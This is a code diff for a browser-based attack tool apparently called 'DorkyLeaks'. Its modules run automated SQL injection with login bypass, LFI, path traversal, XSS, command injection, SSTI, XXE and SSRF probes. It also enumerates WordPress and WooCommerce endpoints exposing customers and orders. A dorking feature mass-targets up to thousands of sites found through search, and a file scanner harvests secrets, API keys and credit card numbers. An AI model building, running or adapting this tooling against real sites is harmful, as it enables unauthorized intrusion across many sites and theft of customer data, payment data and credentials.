+  const base = target.replace(/\/$/, '');
+  for (const path of loginPaths) {
+    modCheckAbort();
+    const url = base + '/' + path;
+    try {
+      const r = await httpMod(url);
+      if (r.status !== 200 && r.status !== 302) continue;
+      const doc = (new DOMParser()).parseFromString(r.text || '', 'text/html');
+      const forms = doc.querySelectorAll('form');
+      for (const form of forms) {
+        const inputs = [...form.querySelectorAll('input[type=text],input[type=email],input[type=password],input:not([type])')];
+        if (inputs.length < 2) continue;
+        mlog('info', 'sqli', '[AUTH] Login form at ' + url);
+        for (const pair of SQLI_AUTH) {
+          modCheckAbort();
+          const up = pair[0], pp = pair[1];
+          const uField = inputs[0].getAttribute('name') || 'username';
+          const pField = inputs[1].getAttribute('name') || 'password';
+          const body = encodeURIComponent(uField) + '=' + encodeURIComponent(up) + '&' + encodeURIComponent(pField) + '=' + encodeURIComponent(pp);
+          try {
+            const rp = await httpMod(url, { method: 'POST', body: body, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
+            const low = (rp.text || '').toLowerCase();
+            if (rp.finalUrl && /dashboard|admin|profile/i.test(rp.finalUrl)) { mlog('vuln', 'sqli', '[AUTH-BYPASS] at ' + url + ' user=' + up); mAddFinding('sqli', { technique: 'auth-bypass', url: url, payload: up + ':' + pp }); return; }
+            if (low.includes('welcome') || low.includes('logout') || low.includes('dashboard')) { mlog('vuln', 'sqli', '[AUTH-BYPASS] keyword: ' + url); mAddFinding('sqli', { technique: 'auth-bypass', url: url, payload: up + ':' + pp }); }
+          } catch (e) { if (e.name === 'AbortError') throw e; }
+        }
+      }
+    } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+}
+
+async function testSQLi(url) {
+  const qi = url.indexOf('?'); if (qi === -1) return;
+  const base = url.slice(0, qi), params = url.slice(qi + 1).split('&');
+  for (const param of params) {
+    const pn = param.split('=')[0], key = base + '?' + pn;
+    if (modTested.sqli.has(key)) continue; modTested.sqli.add(key);
+    mlog('info', 'sqli', 'Testing param=[' + pn + ']');
+    let baseline = null;
+    try { baseline = await httpMod(key + '=1'); } catch (e) {}
+    const baseText = baseline ? baseline.text : null;
+    const eb = await testSQLiErrorBased(base, pn, baseText);
+    if (eb.found) { await testSQLiErrorExtract(base, pn, eb.dbms); continue; }
+    if (await testSQLiUnion(base, pn)) continue;
+    if (await testSQLiBooleanBlind(base, pn)) continue;
+    await testSQLiTimeBased(base, pn);
+    await testSQLiStacked(base, pn);
+  }
+}
+
+async function runSQLi(testable) {
+  setModStatus('sqli', 'running');
+  mlog('info', 'sqli', 'SQLi engine: error | union | boolean | time | auth-bypass');
+  mlog('info', 'sqli', 'Testing ' + testable.length + ' URLs');
+  modTested.sqli.clear();
+  for (let i = 0; i < testable.length; i++) { modCheckAbort(); await testSQLi(testable[i]); }
+  const target = testable.length > 0 ? testable[0].split('?')[0].replace(/\/[^/]*$/, '/') : '';
+  if (target) await testSQLiAuthBypass(target);
+  const n = (modFindings.sqli || []).length;
+  if (n > 0) mlog('vuln', 'sqli', n + ' SQLi finding(s)'); else mlog('ok', 'sqli', 'No SQLi');
+  setModStatus('sqli', 'done');
+}
+
+async function testLFI(url) {
+  const qi = url.indexOf('?'); if (qi === -1) return;
+  const base = url.slice(0, qi), params = url.slice(qi + 1).split('&');
+  for (const param of params) {
+    const pn = param.split('=')[0], key = base + '?' + pn;
+    if (modTested.lfi.has(key)) continue; modTested.lfi.add(key);
+    for (const pay of LFI) {
+      modCheckAbort();
+      try { const r = await httpMod(key + '=' + pay); if (LFI_SIGNS.some(s => (r.text || '').includes(s))) { mlog('vuln', 'lfi', 'LFI [' + pn + ']: ' + key); mAddFinding('lfi', { url: key + '=' + pay, param: pn, payload: pay }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
+    }
+  }
+}
+async function runLFI(testable) {
+  setModStatus('lfi', 'running');
+  mlog('info', 'lfi', 'Testing ' + testable.length + ' URLs for LFI');
+  modTested.lfi.clear();
+  for (let i = 0; i < testable.length; i++) { modCheckAbort(); await testLFI(testable[i]); }
+  const n = (modFindings.lfi || []).length;
+  if (n > 0) mlog('vuln', 'lfi', n + ' LFI finding(s)'); else mlog('ok', 'lfi', 'No LFI');
+  setModStatus('lfi', 'done');
+}
+
+async function runPathTraversal(testable) {
+  setModStatus('pathtraversal', 'running');
+  mlog('info', 'pathtraversal', 'Testing ' + testable.length + ' URLs');
+  const tested = new Set();
+  for (const url of testable) {
+    const qi = url.indexOf('?'); if (qi === -1) continue;
+    const base = url.slice(0, qi), params = url.slice(qi + 1).split('&');
+    for (const param of params) {
+      const pn = param.split('=')[0], key = base + '?' + pn;
+      if (tested.has(key)) continue; tested.add(key);
+      for (const pay of PATH_TRAV) {
+        modCheckAbort();
+        try { const r = await httpMod(key + '=' + pay); if (LFI_SIGNS.some(s => (r.text || '').includes(s))) { mlog('vuln', 'pathtraversal', 'PathTrav [' + pn + ']: ' + key); mAddFinding('pathtraversal', { url: key + '=' + pay, param: pn, payload: pay }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
+      }
+    }
+  }
+  const n = (modFindings.pathtraversal || []).length;
+  if (n > 0) mlog('vuln', 'pathtraversal', n + ' finding(s)'); else mlog('ok', 'pathtraversal', 'No path traversal');
+  setModStatus('pathtraversal', 'done');
+}
+
+function randToken(n) { const c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; let s = ''; for (let i = 0; i < n; i++) s += c[Math.floor(Math.random() * c.length)]; return s; }
+async function testXSS(url) {
+  const qi = url.indexOf('?'); if (qi === -1) return;
+  const base = url.slice(0, qi), params = url.slice(qi + 1).split('&');
+  for (const param of params) {
+    const pn = param.split('=')[0], key = base + '?' + pn;
+    if (modTested.xss.has(key)) continue; modTested.xss.add(key);
+    const tok = randToken(10);
+    for (const tmpl of XSS_TPL) {
+      modCheckAbort();
+      const pay = tmpl.replace(/PAYLOAD/g, tok);
+      try { const r = await httpMod(key + '=' + encodeURIComponent(pay)); if ((r.text || '').includes(tok)) { mlog('vuln', 'xss', 'XSS [' + pn + '] token=' + tok); mAddFinding('xss', { url: key, param: pn, tok: tok, payload: pay }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
+    }
+  }
+}
+async function runXSS(testable) {
+  setModStatus('xss', 'running');
+  mlog('info', 'xss', 'Testing ' + testable.length + ' URLs for XSS');
+  modTested.xss.clear();
+  for (let i = 0; i < testable.length; i++) { modCheckAbort(); await testXSS(testable[i]); }
+  const n = (modFindings.xss || []).length;
+  if (n > 0) mlog('vuln', 'xss', n + ' XSS finding(s)'); else mlog('ok', 'xss', 'No XSS');
+  setModStatus('xss', 'done');
+}
+
+async function runCMDi(testable) {
+  setModStatus('cmdi', 'running');
+  mlog('info', 'cmdi', 'Testing ' + testable.length + ' URLs');
+  const tested = new Set();
+  for (const url of testable) {
+    const qi = url.indexOf('?'); if (qi === -1) continue;
+    const base = url.slice(0, qi), params = url.slice(qi + 1).split('&');
+    for (const param of params) {
+      const pn = param.split('=')[0], key = base + '?' + pn;
+      if (tested.has(key)) continue; tested.add(key);
+      for (const pay of CMDI) {
+        modCheckAbort();
+        try { const r = await httpMod(key + '=' + encodeURIComponent(pay)); const body = r.text || ''; const hit = CMDI_SIGNS.find(s => matchSign(body, s)); if (hit) { const evidence = hit instanceof RegExp ? (body.match(hit) || [''])[0] : hit; mlog('vuln', 'cmdi', 'CMDi [' + pn + '] evidence=' + trunc(evidence, 40)); mAddFinding('cmdi', { url: key, param: pn, payload: pay, evidence: evidence }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
+      }
+    }
+  }
+  const n = (modFindings.cmdi || []).length;
+  if (n > 0) mlog('vuln', 'cmdi', n + ' CMDi finding(s)'); else mlog('ok', 'cmdi', 'No CMDi');
+  setModStatus('cmdi', 'done');
+}
+
+async function runSSTI(testable) {
+  setModStatus('ssti', 'running');
+  mlog('info', 'ssti', 'Testing ' + testable.length + ' URLs');
+  const tested = new Set();
+  for (const url of testable) {
+    const qi = url.indexOf('?'); if (qi === -1) continue;
+    const base = url.slice(0, qi), params = url.slice(qi + 1).split('&');
+    for (const param of params) {
+      const pn = param.split('=')[0], key = base + '?' + pn;
+      if (tested.has(key)) continue; tested.add(key);
+      for (const pair of SSTI) {
+        modCheckAbort();
+        const pay = pair[0], expected = pair[1];
+        try { const r = await httpMod(key + '=' + encodeURIComponent(pay)); if ((r.text || '').includes(expected) && !(r.text || '').includes(pay)) { mlog('vuln', 'ssti', 'SSTI [' + pn + '] "' + pay + '" -> "' + expected + '"'); mAddFinding('ssti', { url: key, param: pn, payload: pay, expected: expected }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
+      }
+    }
+  }
+  const n = (modFindings.ssti || []).length;
+  if (n > 0) mlog('vuln', 'ssti', n + ' SSTI finding(s)'); else mlog('ok', 'ssti', 'No SSTI');
+  setModStatus('ssti', 'done');
+}
+
+async function runXXE(testable) {
+  setModStatus('xxe', 'running');
+  mlog('info', 'xxe', 'Probing ' + testable.length + ' URLs');
+  const tested = new Set();
+  for (const url of testable) {
+    const qi = url.indexOf('?'); if (qi === -1) continue;
+    const base = url.slice(0, qi), params = url.slice(qi + 1).split('&');
+    for (const param of params) {
+      const pn = param.split('=')[0], key = base + '?' + pn;
+      if (tested.has(key)) continue; tested.add(key);
+      for (const pair of [[XXE_PAY_FILE, 'file-read'], [XXE_PAY_OOB, 'oob-ssrf']]) {
+        for (const ct of ['application/xml', 'text/xml']) {
+          modCheckAbort();
+          const xxeBody = pair[0], label = pair[1];
+          try { const r = await httpMod(key, { method: 'POST', body: xxeBody, headers: { 'Content-Type': ct } }); const ev = LFI_SIGNS.find(s => (r.text || '').includes(s)) || SSRF_SIGNS.find(s => (r.text || '').includes(s)); if (ev) { mlog('vuln', 'xxe', 'XXE (' + label + ') [' + pn + ']'); mAddFinding('xxe', { url: key, param: pn, payload: label }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
+        }
+      }
+    }
+  }
+  const n = (modFindings.xxe || []).length;
+  if (n > 0) mlog('vuln', 'xxe', n + ' XXE finding(s)'); else mlog('ok', 'xxe', 'No XXE');
+  setModStatus('xxe', 'done');
+}
+
+async function runCSRF(testable) {
+  setModStatus('csrf', 'running');
+  mlog('info', 'csrf', 'Checking POST forms');
+  const checked = new Set();
+  for (const url of testable) {
+    const base = url.split('?')[0];
+    if (checked.has(base)) continue; checked.add(base);
+    modCheckAbort();
+    try {
+      const r = await httpMod(base);
+      const doc = (new DOMParser()).parseFromString(r.text || '', 'text/html');
+      for (const form of doc.querySelectorAll('form')) {
+        const method = (form.getAttribute('method') || 'GET').toUpperCase();
+        if (method !== 'POST') continue;
+        const inputs = [...form.querySelectorAll('input')];
+        const hasCsrf = inputs.some(i => { const n = (i.getAttribute('name') || '').toLowerCase(); return n.includes('csrf') || n.includes('token') || n.includes('nonce'); });
+        if (!hasCsrf) { mlog('vuln', 'csrf', 'POST form w/o CSRF: ' + base); mAddFinding('csrf', { url: base, issue: 'POST form missing CSRF' }); }
+      }
+    } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+  const n = (modFindings.csrf || []).length;
+  if (n > 0) mlog('vuln', 'csrf', n + ' CSRF finding(s)'); else mlog('ok', 'csrf', 'No CSRF issues');
+  setModStatus('csrf', 'done');
+}
+
+async function runJWT(testable) {
+  setModStatus('jwt', 'running');
+  mlog('info', 'jwt', 'JWT weakness detection');
+  const jwtRe = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g;
+  for (const url of testable) {
+    modCheckAbort();
+    try {
+      const r = await httpMod(url);
+      const tokens = (r.text || '').match(jwtRe) || [];
+      for (const tok of tokens) {
+        const parts = tok.split('.');
+        if (parts.length < 2) continue;
+        try {
+          const pad = s => s + '='.repeat((4 - s.length % 4) % 4);
+          const hdr = JSON.parse(atob(pad(parts[0]).replace(/-/g, '+').replace(/_/g, '/')));
+          const pay = JSON.parse(atob(pad(parts[1]).replace(/-/g, '+').replace(/_/g, '/')));
+          mlog('info', 'jwt', 'JWT found: ' + url);
+          if (hdr.alg === 'none' || hdr.alg === 'NONE') { mlog('vuln', 'jwt', 'alg=none: ' + url); mAddFinding('jwt', { url: url, issue: 'JWT alg:none' }); }
+          if (!pay.exp) { mlog('vuln', 'jwt', 'JWT missing exp: ' + url); mAddFinding('jwt', { url: url, issue: 'JWT missing exp' }); }
+        } catch (pe) {}
+      }
+    } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+  const n = (modFindings.jwt || []).length;
+  if (n > 0) mlog('vuln', 'jwt', n + ' JWT issue(s)'); else mlog('ok', 'jwt', 'No JWT issues');
+  setModStatus('jwt', 'done');
+}
+
+async function runWordPress(target) {
+  if (!target.endsWith('/')) target += '/';
+  setModStatus('wordpress', 'running');
+  mlog('info', 'wordpress', 'Probing WordPress');
+  let isWP = false;
+  try { const r = await httpMod(target); if ((r.text || '').includes('wp-content') || (r.text || '').includes('wp-includes') || (r.text || '').includes('/wp-json')) { isWP = true; mlog('info', 'wordpress', 'WordPress detected'); } } catch (e) { if (e.name === 'AbortError') throw e; }
+  for (const entry of WP_VULNS) {
+    modCheckAbort();
+    const url = target + entry.path;
+    try { const r = await httpMod(url); if (entry.check(r)) { mlog('vuln', 'wordpress', entry.msg + ' | ' + url); mAddFinding('wordpress', { url: url, issue: entry.msg }); isWP = true; } } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+  for (const eu of [target + 'wp-json/wp/v2/users', target + '?author=1']) {
+    modCheckAbort();
+    try { const r = await httpMod(eu); if (r.status === 200 && ((r.text || '').includes('"slug"') || (r.text || '').includes('"name"'))) { mlog('vuln', 'wordpress', 'User enum: ' + eu); mAddFinding('wordpress', { url: eu, issue: 'User enumeration' }); } } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+  mlog('info', 'wordpress', 'Scanning plugins');
+  const concPlugin = getConc();
+  const pluginItems = WP_COMMON_PLUGINS.slice(0, 20);
+  for (let i = 0; i < pluginItems.length; i += concPlugin) {
+    await Promise.all(pluginItems.slice(i, i + concPlugin).map(async plugin => {
+      modCheckAbort();
+      const url = target + 'wp-content/plugins/' + plugin + '/readme.txt';
+      try { const r = await httpMod(url); if (r.status === 200) { const vm = (r.text || '').match(/stable tag:\s*([\d.]+)/i); const ver = vm ? vm[1] : '?'; mlog('vuln', 'wordpress', 'Plugin: ' + plugin + ' v' + ver); mAddFinding('wordpress', { url: url, issue: 'Plugin: ' + plugin + ' v' + ver }); } } catch (e) { if (e.name === 'AbortError') throw e; }
+    }));
+  }
+  for (const theme of WP_COMMON_THEMES.slice(0, 15)) {
+    modCheckAbort();
+    const url = target + 'wp-content/themes/' + theme + '/style.css';
+    try { const r = await httpMod(url); if (r.status === 200) { const vm = (r.text || '').match(/Version:\s*([\d.]+)/i); mlog('info', 'wordpress', 'Theme: ' + theme + ' v' + (vm ? vm[1] : '?')); } } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+  const n = (modFindings.wordpress || []).length;
+  if (n > 0) mlog('vuln', 'wordpress', n + ' issue(s)'); else mlog(isWP ? 'info' : 'ok', 'wordpress', isWP ? 'WP detected' : 'No WordPress');
+  setModStatus('wordpress', 'done');
+}
+
+async function runWooCommerce(target) {
+  if (!target.endsWith('/')) target += '/';
+  setModStatus('woocommerce', 'running');
+  mlog('info', 'woocommerce', 'Probing WooCommerce');
+  let isWoo = false;
+  const checks = [
+    { path: 'wp-json/wc/v3/products', check: r => r.status === 200 && (r.text || '').includes('"id"'), msg: 'Products unauthenticated' },
+    { path: 'wp-json/wc/v3/orders', check: r => r.status === 200 && (r.text || '').includes('"id"'), msg: 'Orders unauthenticated' },
+    { path: 'wp-json/wc/v3/customers', check: r => r.status === 200 && (r.text || '').includes('"id"'), msg: 'Customers exposed PII' },
+    { path: 'wp-json/wc/v3/coupons', check: r => r.status === 200 && (r.text || '').includes('"id"'), msg: 'Coupons exposed' },
+    { path: 'wp-json/wc/v3/payment_gateways', check: r => r.status === 200, msg: 'Payment gateways exposed' },
+    { path: 'wp-json/wc/v3/settings', check: r => r.status === 200, msg: 'Settings unauthenticated' }
+  ];
+  for (const c of checks) {
+    modCheckAbort();
+    const url = target + c.path;
+    try { const r = await httpMod(url); if (c.check(r)) { mlog('vuln', 'woocommerce', c.msg + ' | ' + url); mAddFinding('woocommerce', { url: url, issue: c.msg }); isWoo = true; } } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+  const n = (modFindings.woocommerce || []).length;
+  if (n > 0) mlog('vuln', 'woocommerce', n + ' issue(s)'); else mlog(isWoo ? 'info' : 'ok', 'woocommerce', isWoo ? 'Woo detected' : 'No WooCommerce');
+  setModStatus('woocommerce', 'done');
+}
+
+/* ===== MODULES ===== */
+const MODULES = [
+  { id: 'crawler', name: 'Crawler', desc: 'Link discovery', run: async t => { const urls = await runModuleCrawler(t); _testableModUrls = [...urls].filter(u => u.includes('?')); } },
+  { id: 'dirbust', name: 'DirBuster', desc: 'Directory brute-force', run: t => runDirbust(t) },
+  { id: 'sensitivefiles', name: 'Sensitive Files', desc: 'Exposed file check', run: t => runSensitiveFiles(t) },
+  { id: 'headers', name: 'Security Headers', desc: 'HTTP security headers', run: t => runHeaders(t) },
+  { id: 'ssl', name: 'SSL/TLS', desc: 'HTTPS & HSTS check', run: t => runSSL(t) },
+  { id: 'cors', name: 'CORS', desc: 'Cross-origin policy', run: t => runCORS(t) },
+  { id: 'clickjacking', name: 'Clickjacking', desc: 'X-Frame-Options check', run: t => runClickjacking(t) },
+  { id: 'cachecheck', name: 'Cache Headers', desc: 'Cache-Control audit', run: t => runCacheCheck(t) },
+  { id: 'infodisclosure', name: 'Info Disclosure', desc: 'Secrets/keys in responses', run: t => runInfoDisclose(t) },
+  { id: 'cookies', name: 'Cookies', desc: 'Cookie flag audit', run: t => runCookies(t) },
+  { id: 'httpmethods', name: 'HTTP Methods', desc: 'Dangerous method probe', run: t => runHTTPMethods(t) },
+  { id: 'adminfinder', name: 'Admin Finder', desc: 'Admin panel discovery', run: t => runAdminFinder(t) },
+  { id: 'apiprobe', name: 'API Probe', desc: 'Unauthenticated API scan', run: t => runAPIProbe(t) },
+  { id: 'wordpress', name: 'WordPress', desc: 'WP vuln scan', run: t => runWordPress(t) },
+  { id: 'woocommerce', name: 'WooCommerce', desc: 'WooCommerce API audit', run: t => runWooCommerce(t) },
+  { id: 'openredirect', name: 'Open Redirect', desc: 'Redirect parameter abuse', run: t => runOpenRedirect(t) },
+  { id: 'subdomaintakeover', name: 'Subdomain Takeover', desc: 'Takeover fingerprinting', run: t => runSubdomainTakeover(t) },
+  { id: 'bruteforce', name: 'Brute Force Check', desc: 'Login rate limit check', run: t => runBruteForceCheck(t) },
+  { id: 'lfi', name: 'LFI', desc: 'Local file inclusion', run: async t => { await ensureTestable(t); await runLFI(_testableModUrls); } },
+  { id: 'pathtraversal', name: 'Path Traversal', desc: 'Directory traversal', run: async t => { await ensureTestable(t); await runPathTraversal(_testableModUrls); } },
+  { id: 'sqli', name: 'SQLi', desc: 'SQL injection', run: async t => { await ensureTestable(t); await runSQLi(_testableModUrls); } },
+  { id: 'xss', name: 'XSS', desc: 'Reflected XSS', run: async t => { await ensureTestable(t); await runXSS(_testableModUrls); } },
+  { id: 'cmdi', name: 'CMDi', desc: 'Command injection', run: async t => { await ensureTestable(t); await runCMDi(_testableModUrls); } },
+  { id: 'ssti', name: 'SSTI', desc: 'Template injection', run: async t => { await ensureTestable(t); await runSSTI(_testableModUrls); } },
+  { id: 'xxe', name: 'XXE', desc: 'XML external entity', run: async t => { await ensureTestable(t); await runXXE(_testableModUrls); } },
+  { id: 'csrf', name: 'CSRF', desc: 'Missing CSRF tokens', run: async t => { await ensureTestable(t); await runCSRF(_testableModUrls); } },
+  { id: 'ssrf', name: 'SSRF', desc: 'Server-side request forgery', run: async t => runSSRFModule(t) },
+  { id: 'jwt', name: 'JWT', desc: 'JWT weakness detection', run: async t => { await ensureTestable(t); await runJWT(_testableModUrls); } }
+];
+async function ensureTestable(target) {
+  if (_testableModUrls.length > 0) return;
+  mlog('warn', 'system', 'No testable URLs - auto-crawling');
+  const urls = await runModuleCrawler(target);
+  _testableModUrls = [...urls].filter(u => u.includes('?'));
+}
+
+/* ===== UI ===== */
+function setLive(s, txt) { $('live').className = 'live' + (s ? ' ' + s : ''); $('liveTxt').textContent = txt; }
+function updateProgress(pct, txt) {
+  $('prog').classList.add('show');
+  $('fill').style.width = Math.max(0, Math.min(100, pct)) + '%';
+  $('ppct').textContent = Math.round(pct) + '%';
+  if (txt) $('ptxt').textContent = txt;
+}
+function updateModuleProgress(pct) { const f = $('moduleFill'); if (f) f.style.width = Math.max(0, Math.min(100, pct)) + '%'; }
+function toast(m) { const t = $('toast'); t.textContent = m; t.classList.add('show'); clearTimeout(toast._t); toast._t = setTimeout(() => t.classList.remove('show'), 1600); }
+
+$$('#seg button').forEach(b => b.addEventListener('click', () => {
+  $$('#seg button').forEach(x => x.classList.toggle('on', x === b));
+  $$('.tab').forEach(t => t.classList.toggle('on', t.id === 'tab-' + b.dataset.tab));
+  if (b.dataset.tab === 'results') renderResults();
+  if (b.dataset.tab === 'modules') buildModuleUI();
+  if (b.dataset.tab === 'queue') renderQueueList();
+}));
+
+let runningTask = false;
+function startTaskUI(btnId, label) {
+  runningTask = true; abortFlag = false; setPaused(false);
+  setLive('on', label);
+  const btn = $(btnId); if (btn) { btn.disabled = true; btn.innerHTML = '<span class="spin"></span>running'; }
+  $('pauseBtn').disabled = false; $('stopBtn').disabled = false;
+}
+function endTaskUI(btnId, label) {
+  runningTask = false; setLive('ok', 'ready');
+  const btn = $(btnId); if (btn) { btn.disabled = false; btn.textContent = label; }
+  $('pauseBtn').disabled = true; $('stopBtn').disabled = true;
+  setPaused(false);
+  setTimeout(() => { if (!runningTask) { $('prog').classList.remove('show'); $('fill').style.width = '0%'; } }, 3500);
+  renderResults();
+}
+
+$('crawlGo').addEventListener('click', async () => {
+  const url = $('crawlUrl').value.trim();
+  if (!url) { toast('enter a url'); return; }
+  if (runningTask) { toast('busy'); return; }
+  if (!poolReady) { toast('workers not ready'); return; }
+  startTaskUI('crawlGo', 'crawling');
+  $('crawlLog').innerHTML = ''; lineCounts.crawlLog = 0; $('crawlCnt').textContent = '0 lines';
+  try {
+    const stats = await crawlSite(url);
+    tlog('crawlLog', '+', 'SUMMARY - probed=' + stats.probed + ' hits=' + stats.hits + ' files=' + stats.files + ' vulns=' + stats.vulns + ' findings=' + state.findings.length, 'hit');
+    toast(stats.hits + ' hits - ' + stats.vulns + ' vulns');
+  } catch (e) { tlog('crawlLog', 'x', 'fatal: ' + e.message, 'bad'); }
+  endTaskUI('crawlGo', 'Start crawl');
+});
+$('crawlClear').addEventListener('click', () => { $('crawlLog').innerHTML = ''; lineCounts.crawlLog = 0; $('crawlCnt').textContent = '0 lines'; });
+
+$('dorkGo').addEventListener('click', async () => {
+  const query = $('dorkQ').value.trim();
+  if (!query) { toast('enter a query'); return; }
+  if (runningTask) { toast('busy'); return; }
+  if (!poolReady) { toast('workers not ready'); return; }
+  const max = Math.max(1, Math.min(5000, parseInt($('dorkMax').value, 10) || 100));
+  startTaskUI('dorkGo', 'dorking');
+  $('dorkLog').innerHTML = ''; lineCounts.dorkLog = 0; $('dorkCnt').textContent = '0 lines';
+  try {
+    const urls = await publicwwwSearch(query, max);
+    if (!urls.length) { tlog('dorkLog', 'x', 'no urls', 'bad'); }
+    else {
+      tlog('dorkLog', '>', 'crawling ' + urls.length + ' urls...', 'hdr');
+      for (let i = 0; i < urls.length; i++) {
+        if (abortFlag) { tlog('dorkLog', '!', 'stopped by user', 'warn'); break; }
+        tlog('dorkLog', '=', '[' + (i + 1) + '/' + urls.length + '] ' + urls[i], 'hdr');
+        await crawlSite(urls[i], 'dorkLog');
+        updateProgress(((i + 1) / urls.length) * 100, 'dork ' + (i + 1) + '/' + urls.length + ' - ' + state.findings.length + ' findings');
+      }
+      tlog('dorkLog', '+', 'ALL DONE - ' + state.findings.length + ' findings', 'hit');
+    }
+  } catch (e) { tlog('dorkLog', 'x', 'fatal: ' + e.message, 'bad'); }
+  endTaskUI('dorkGo', 'Run dork');
+});
+$('dorkClear').addEventListener('click', () => { $('dorkLog').innerHTML = ''; lineCounts.dorkLog = 0; $('dorkCnt').textContent = '0 lines'; });
+
+$('pauseBtn').addEventListener('click', () => { setPaused(!pausedFlag); const activeLog = $('tab-modules').classList.contains('on') ? 'moduleLog' : 'crawlLog'; tlog(activeLog, pausedFlag ? '||' : '>', pausedFlag ? 'PAUSED' : 'RESUMED', 'warn'); });
+$('stopBtn').addEventListener('click', () => { abortFlag = true; setPaused(false); tlog('crawlLog', '#', 'STOP requested', 'warn'); tlog('dorkLog', '#', 'STOP requested', 'warn'); tlog('moduleLog', '#', 'STOP requested', 'warn'); });
+
+/* Files */
+const fileInput = $('fileInput'), drop = $('drop'), fileList = $('fileList');
+drop.addEventListener('click', () => fileInput.click());
+drop.addEventListener('dragover', e => { e.preventDefault(); drop.classList.add('over'); });
+drop.addEventListener('dragleave', () => drop.classList.remove('over'));
+drop.addEventListener('drop', e => { e.preventDefault(); drop.classList.remove('over'); handleFiles(e.dataTransfer.files); });
+fileInput.addEventListener('change', () => { handleFiles(fileInput.files); fileInput.value = ''; });
+function handleFiles(list) {
+  for (const f of list) {
+    const reader = new FileReader();
+    reader.onload = ev => { state.files.push({ name: f.name, size: f.size, content: ev.target.result }); renderFiles(); };
+    reader.readAsText(f);
+  }
+}
+function renderFiles() {
+  if (!state.files.length) { fileList.innerHTML = ''; return; }
+  fileList.innerHTML = state.files.map((f, i) => '<div class="card" data-i="' + i + '"><div class="fl">F</div><div class="mid"><div class="ad">' + esc(f.name) + '</div><div class="sub">' + humanSize(f.size) + '</div></div></div>').join('');
+  fileList.querySelectorAll('.card').forEach(c => c.addEventListener('click', () => { state.files.splice(+c.dataset.i, 1); renderFiles(); }));
+}
+$('clearFiles').addEventListener('click', () => { state.files = []; renderFiles(); toast('cleared'); });
+$('scanFiles').addEventListener('click', () => {
+  if (!state.files.length) { toast('nothing to scan'); return; }
+  $('crawlLog').innerHTML = ''; lineCounts.crawlLog = 0; $('crawlCnt').textContent = '0 lines';
+  tlog('crawlLog', '>', 'FILE SCAN - ' + state.files.length + ' files', 'hdr');
+  for (const f of state.files) {
+    tlog('crawlLog', 'o', 'file ' + f.name + ' - ' + humanSize(f.size), 'hdr');
+    const secs = scanSecrets(f.content, f.name);
+    for (const x of secs) if (addFinding(x.type, x.value, x.source, 'FORMAT_VALID')) tlog('crawlLog', '*', x.type + ' = ' + trunc(x.value, 80), 'hit');
+    const cards = scanCards(f.content, f.name);
+    for (const c of cards) if (addFinding('Credit Card', c.value, c.source, 'FORMAT_VALID')) tlog('crawlLog', '$', 'Card = ' + trunc(c.value, 60), 'hit');
+    const nonces = scanNonces(f.content, f.name);
+    for (const n of nonces) if (addFinding('Nonce: ' + n.type, n.value, n.source, 'FORMAT_VALID')) tlog('crawlLog', 'n', n.type + ' = ' + trunc(n.value, 50), 'hit');
+    const gws = detectGateways(f.content);
+    for (const g of gws) {
+      if (g.startsWith('\x00')) { const parts = g.split('\x00'); const name = parts[1], val = parts[2]; if (addFinding(name, val, f.name, 'FORMAT_VALID')) tlog('crawlLog', '@', name + ' = ' + trunc(val, 60), 'gw'); }
+      else { state.gateways.add(g); if (addFinding('Gateway: ' + g, f.name, f.name, 'FORMAT_VALID')) tlog('crawlLog', '#', 'Gateway ' + g, 'gw'); }
+    }
+  }
+  tlog('crawlLog', '+', 'FILE SCAN done - ' + state.findings.length + ' total findings', 'hit');
+  $$('#seg button').forEach(b => b.classList.toggle('on', b.dataset.tab === 'results'));
+  $$('.tab').forEach(t => t.classList.toggle('on', t.id === 'tab-results'));
+  toast('found ' + state.findings.length);
+  renderResults();
+});
+
+/* Paths */
+function loadPaths() {
+  const stored = localStorage.getItem('DorkyLeaks_paths');
+  const src = stored || BUILTIN_PATHS.join('\n');
+  PATHS = src.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
+  $('pathsEditor').value = src;
+  $('pathsCount').textContent = PATHS.length + ' paths loaded';
+}
+$('pathsSave').addEventListener('click', () => { const v = $('pathsEditor').value; localStorage.setItem('DorkyLeaks_paths', v); PATHS = v.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#')); $('pathsCount').textContent = PATHS.length + ' paths loaded'; toast('saved ' + PATHS.length); });
+$('pathsReset').addEventListener('click', () => { localStorage.removeItem('DorkyLeaks_paths'); loadPaths(); toast('reset'); });
+
+/* Settings */
+const SETTING_KEYS = ['wispUrl', 'reqTimeout', 'concurrency', 'userAgentInput', 'extraHeaders', 'proxyListUrl'];
+function loadSettings() { SETTING_KEYS.forEach(k => { const stored = localStorage.getItem('DL_' + k); if (stored !== null) { const el = $(k); if (el) el.value = stored; } }); }
+function saveSettings() { SETTING_KEYS.forEach(k => { const el = $(k); if (el) { try { localStorage.setItem('DL_' + k, el.value); } catch {} } }); }
+$('settingsSave').addEventListener('click', async () => {
+  saveSettings();
+  toast('saved - reconnecting');
+  if (wispClient) { try { wispClient.disconnect(); } catch {} wispClient = null; }
+  poolReady = false;
+  await startPool();
+});
+$('settingsReset').addEventListener('click', () => {
+  SETTING_KEYS.forEach(k => {
+    try { localStorage.removeItem('DL_' + k); } catch {}
+    const el = $(k); if (!el) return;
+    if (k === 'reqTimeout') el.value = 20000;
+    else if (k === 'concurrency') el.value = 10;
+    else if (k === 'userAgentInput') el.value = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
